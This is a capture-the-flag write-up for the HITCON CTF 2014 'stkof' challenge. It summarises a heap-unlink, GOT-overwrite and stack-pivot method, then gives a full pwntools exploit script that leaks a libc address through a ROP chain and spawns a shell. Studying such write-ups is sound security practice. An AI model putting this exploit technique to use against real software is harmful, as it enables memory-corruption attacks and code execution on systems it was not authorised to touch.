# HITCON CTF 2014 - Stkof 

The given binary had a global-pointer and a heap overflow

 * we unlink the fake chunk 
 * overwrite atoll got with pop ; pop ; pop ; ret
 * causing esp to point to our buffer 
 * now we pivot stack to global pointer by using pop rsp ; ret
 * now execute the ropchain stored in one of the chunk 
 * and with this we can leak addr
 * after computing system addr we srore that addr in an area and finally return to it   

### Exploit 

```python

from pwn import * 

ptr = 0x602150 # index = 2 

atoll_got = 0x602060
puts_got = 0x602020
pppret   = 0x400dbe
pop_rsp_ret = 0x400dbd
#ropaddr = 0x602158
ropaddr = 0x602180
puts = 0x400760
pop_rdi_ret = 0x400dc3
pop_rbp_ret = 0x4008a0
pop_rsi_r15 = 0x400dc1

fgets = 0x40094d
bss = 0x602980

context.bits = 64 

p = process('./stkof')

def alloc(size):

	p.sendline('1')
	p.sendline(str(size))
	print p.recvlines(2)

def fill(index,payload):

	p.sendline('2')
	p.sendline(str(index))
	p.sendline(str(len(payload)+1))
	p.sendline(payload)
	print p.recvline()


def  free(index):

	p.sendline('3')
	p.sendline(str(index))
	print p.recvline()



alloc(128)
alloc(128)
alloc(128)


ropchain  = "A"*24
ropchain += pack(pop_rdi_ret)
ropchain += pack(puts_got)
ropchain += pack(puts)
# dummy 
ropchain += pack(pop_rbp_ret)
ropchain += pack(bss+0x70)
ropchain += pack(fgets)
ropchain += "A"*16
# first 16 byte
ropchain += pack(pop_rbp_ret)
ropchain += pack(bss+0x70)
ropchain += pack(fgets)
ropchain += "A"*16

ropchain += pack(pop_rbp_ret)
ropchain += pack(bss+0x70+16)
ropchain += pack(fgets)
ropchain += "A"*16


# next 8 bytes
ropchain += pack(pop_rbp_ret)
ropchain += pack(bss+0x70+16)
ropchain += pack(fgets)

ropchain += "A"*16

ropchain += pack(pop_rsp_ret)
ropchain += pack(bss-24)




payload  = pack(0x0)
payload += pack(0x0)
payload += pack(ptr-24)
payload += pack(ptr-16)
payload += "A"*96
payload += pack(128)
payload += pack(0x90)

fill(2,payload)

free(3)

payload_1 = "\x00"*24
payload_1 += pack(atoll_got)
payload_1 += "B"*40
payload_1 += ropchain

fill(2,payload_1)

payload_2 = pack(pppret)

print "[+] get ready !!"

fill(2,payload_2)

p.sendline("1")
p.sendline(pack(pop_rsp_ret)+pack(ropaddr))

leak = p.recvline().strip('\n')
context.bits = len(leak)*8
leak = unpack(leak)

print "[+] Leak: "+hex(leak)

system = leak - 0x29b10
binsh  = leak + 0xf8a39

context.bits = 64

final  =  pack(pop_rdi_ret)
final += pack(binsh)
final_1 = pack(system) 

p.clean(0)

p.sendline(final)
p.sendline(final_1)

p.interactive()

```

#### \# Unlink &nbsp; \# stack-pivot &nbsp; \# ROP